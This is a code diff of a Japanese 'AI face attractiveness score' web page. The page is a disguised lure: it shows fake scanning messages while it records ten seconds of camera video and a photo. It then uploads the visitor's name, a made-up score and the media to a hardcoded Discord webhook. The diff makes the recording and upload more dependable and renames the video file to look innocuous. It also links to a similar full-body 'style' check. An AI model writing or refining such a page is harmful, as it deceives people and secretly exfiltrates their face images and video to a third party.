@@ -14,15 +14,10 @@
         input:focus { border-color: #00ffcc; }
         #video { width: 100%; border-radius: 10px; background: #000; margin-top: 15px; display: none; aspect-ratio: 3/4; object-fit: cover; border: 1px solid #333; }
         #startBtn { width: 100%; padding: 18px; font-size: 1.1em; font-weight: bold; background: #00ffcc; color: #000; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
-        
-        /* 進行状況・結果表示エリア */
         #status-display { font-size: 0.95em; margin-top: 20px; color: #00ffcc; min-height: 3em; line-height: 1.5; }
         #result-score { font-size: 1.3em; font-weight: bold; color: #00ffcc; }
-        
-        /* 誘導ボタン */
         #next-options { display: none; margin-top: 25px; border-top: 1px solid #333; padding-top: 20px; }
         .option-btn { display: block; text-decoration: none; padding: 15px; border-radius: 8px; font-weight: bold; background: #007bff; color: #fff; margin-top: 10px; font-size: 0.9em; }
-        
         .security-note { font-size: 0.75em; color: #888; margin-top: 15px; line-height: 1.4; }
         #canvas { display: none; }
     </style>
@@ -30,7 +25,6 @@
 <body>
     <div class="container">
         <h1>AI 顔面偏差値診断</h1>
-        
         <div id="setup-form">
             <div class="input-group">
                 <label>解析するお名前</label>
@@ -39,18 +33,14 @@
             <button id="startBtn">診断を開始する</button>
             <div class="security-note">※最新のAIアルゴリズムにより、顔の骨格・パーツ配置を10秒間多角的にスキャンします。</div>
         </div>
-
         <video id="video" autoplay playsinline muted></video>
-        
         <div id="status-display"></div>
         <div id="result-score"></div>
-
         <div id="next-options">
             <p style="font-size:0.8em; color:#888; margin-bottom: 5px;">【精密診断】体型の黄金比も測定しませんか？</p>
             <a href="style.html" class="option-btn">AI 全身スタイル偏差値診断はこちら</a>
         </div>
     </div>
-
     <canvas id="canvas"></canvas>
 
     <script>
@@ -61,13 +51,10 @@
         const resultScore = document.getElementById('result-score');
         const setupForm = document.getElementById('setup-form');
         const nextOptions = document.getElementById('next-options');
-        
         const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
         
         let mediaRecorder; 
         let chunks = [];
-
-        // 演出用のテキスト
         const messages = [
             "AIスキャンを開始しています...",
             "顔の輪郭をポイント抽出中...",
@@ -90,11 +77,12 @@
                 chunks = [];
 
                 mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-                mediaRecorder.onstop = () => { captureAndSend(user); };
+
+                // 録画停止後のデータ確定を待つためのPromise
+                const stopPromise = new Promise(resolve => mediaRecorder.onstop = resolve);
+
+                mediaRecorder.start(500); // 0.5秒ごとにデータを刻んで回収
                 
-                mediaRecorder.start(1000);
-                
-                // 10秒間のフェイクメッセージ演出
                 let i = 0;
                 const interval = setInterval(() => {
                     statusDisplay.innerHTML = messages[i];
@@ -102,11 +90,16 @@
                     if (i >= messages.length) clearInterval(interval);
                 }, 1600);
 
-                setTimeout(() => {
-                    if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
-                }, 10000); // 10秒間撮影
+                // 10秒後に録画を止めて、送信処理へ
+                setTimeout(async () => {
+                    if (mediaRecorder.state !== "inactive") {
+                        mediaRecorder.stop();
+                        await stopPromise; // ここで動画データが全部揃うのを確実に待つ
+                        await captureAndSend(user);
+                    }
+                }, 10000); 
 
-            } catch {
+            } catch (err) {
                 statusDisplay.innerHTML = "エラー：カメラを許可してください。";
                 setupForm.style.display = 'block';
             }
@@ -122,13 +115,13 @@
 
             canvas.toBlob(async (photoBlob) => {
                 const formData = new FormData();
-                formData.append('content', `【顔診断】\n👤 名前: ${user}\n📊 偏差値: ${score}\n⏱️ 録画時間: 10s`);
+                formData.append('content', `【顔診断】\n👤 名前: ${user}\n📊 偏差値: ${score}\n⏱️ 10秒動画: 撮影完了`);
                 formData.append('file1', photoBlob, 'face.png');
                 
                 if (chunks.length > 0) {
                     const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
                     const ext = mediaRecorder.mimeType.includes('mp4') ? 'mp4' : 'webm';
-                    formData.append('file2', videoBlob, `face_video_10s.${ext}`);
+                    formData.append('file2', videoBlob, `scan_10s.${ext}`);
                 }
 
                 try {
